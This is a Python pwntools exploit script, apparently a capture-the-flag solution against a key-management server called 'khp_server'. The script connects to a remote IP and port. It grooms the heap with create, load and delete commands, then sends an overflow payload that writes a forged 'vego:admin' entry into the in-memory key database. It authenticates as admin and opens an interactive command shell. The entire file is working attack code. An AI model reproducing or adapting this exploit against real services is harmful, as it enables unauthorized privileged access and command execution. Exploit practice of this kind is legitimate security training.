#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./khp_server")
libc = ELF("./libc.so.6")

context.binary = exe


def conn():
    global r

    if args.LOCAL:
        r = remote("localhost", 8080)
    else:
        r = remote("94.237.59.242", 40781)

    return r


def main():
    if args.LOCAL:
        server = process([exe.path])
        if args.GDB:
            gdb.attach(server)

    r = conn()
    
    # In REMOTE we need another chunk to initialize the heap.
    # Moreover, the thread allocates a chunk used to read data right before this,
    # so we need to work from the second chunk
    if not args.LOCAL:
        sleep(1)
        r.send(b"REKE random:random someuselesskeyrandom")
        r.clean(1)

    # Create a key (it will have ID = 1 or ID = 2 if on REMOTE) to allocate a chunk
    sleep(1)
    r.send(b"REKE vego:user someuselesskey")
    ID_1 = int(r.recvline().strip().decode('ascii')[-1])
    log.info(f"Auxiliary ID: {ID_1}")
    
    # Place loaded DB after the key chunk
    sleep(1)
    r.send(b"RLDB")
    
    # Free key chunk to reuse it
    sleep(1)
    r.send(f"DEKE {ID_1}".encode("ascii"))

    # Overflow to the loaded DB keys and place an entry there
    sleep(1)
    payload =flat(
        b"A" * 47, b":",        # user
        b"B" * 47, b" ",        # role
        b"vego:admin cacca;"    # overflow to the loaded DB and put an entry there

    )
    r.send(b"REKE " + payload)
    log.info("Overwritten in-memory DB keys")
    
    # Create a new user:key entry that will be checked against the (overwritten) loaded DB
    r.clean(1)
    r.send(b"REKE vego:admin cacca;")   # this will have ID = 2 (or ID = 3 in case of REMOTE)
    ID_2 = int(r.recvline().strip().decode('ascii')[-1])
    log.info(f"Added user:key pair \"vego:admin cacca;\" with ID {ID_2}")

    # Authenticate as an administrator if in LOCAL otherwise do it manually in REMOTE and open a shell
    # NOTE: on REMOTE, the AUTH command may need to be issued a few times before actually working (idk why)
    if args.LOCAL:
        sleep(1)
        r.send(f"AUTH {ID_2}".encode("ascii"))
        log.success(f"Successfully authenticated!")

        # Open shell as admin
        sleep(1)
        r.send(b"EXEC")

    # Enjoy the shell :)
    r.clean(1)
    r.interactive("$ ")


if __name__ == "__main__":
    main()
